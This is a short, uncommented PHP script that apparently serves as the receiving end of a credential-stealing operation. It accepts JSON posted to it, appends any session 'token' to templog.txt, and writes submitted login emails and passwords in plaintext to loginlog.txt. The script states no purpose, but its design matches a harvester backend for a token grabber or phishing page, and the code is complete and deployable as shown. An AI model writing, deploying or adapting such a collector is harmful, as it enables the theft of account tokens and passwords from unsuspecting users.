<?php
$cont = file_get_contents('php://input');
$data = json_decode($cont);

if(isset($data->token)) {
  $file = fopen("templog.txt", "a");
  fwrite($file, $data->token."\n");
  fclose($file);
}

if(isset($data->loginData)) {
  $loginData = $data->loginData;
  $meme = json_decode($loginData);
  if(isset($meme->login) && isset($meme->password)) {
    $file = fopen("loginlog.txt", "a");
    fwrite($file, "Email: ".$meme->login."\n");
    fwrite($file, "Password: ".$meme->password."\n\n");
    fclose($file);
  }
}
?>
